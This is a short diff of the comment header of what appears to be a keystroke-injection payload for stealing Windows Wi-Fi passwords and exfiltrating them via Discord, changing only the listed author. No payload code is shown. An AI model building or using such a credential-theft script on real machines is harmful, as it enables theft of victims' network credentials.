@@ -1,7 +1,7 @@
 REM ###################################################################
 REM #                                                                 |
 REM # Title        : WLAN-Windows-Passwords-Discord-Exfiltration      |
-REM # Author       : Aleff                                            |
+REM # Author       : Zenin                                            |
 REM # Description: A script used to stole target WLAN Passwords.      |
 REM # Category     : Credentials                                      |
 REM # Target       : Windows 10-11                                    |
